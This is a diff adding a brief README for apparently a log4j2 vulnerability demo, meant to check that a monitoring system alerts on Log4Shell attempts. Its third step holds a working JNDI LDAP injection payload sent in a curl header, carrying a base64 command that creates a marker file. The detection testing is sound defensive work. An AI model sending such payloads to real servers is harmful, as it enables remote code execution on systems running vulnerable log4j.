@@ -1,0 +1,10 @@
+In order to test the log4j2 vulnerability:
+
+1. Have a log4j2 configuration file with the logzio token and listener.
+
+2. Build/pull the docker image and run:
+   docker run -v $(pwd)/log4j2.xml:/app/log4j2.xml -p 8080:8080 logzio/log4j2-vulnerability-demo
+
+3. run: curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1388/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
+   This simulate a jndi attack and should trigger alert in our system.
+
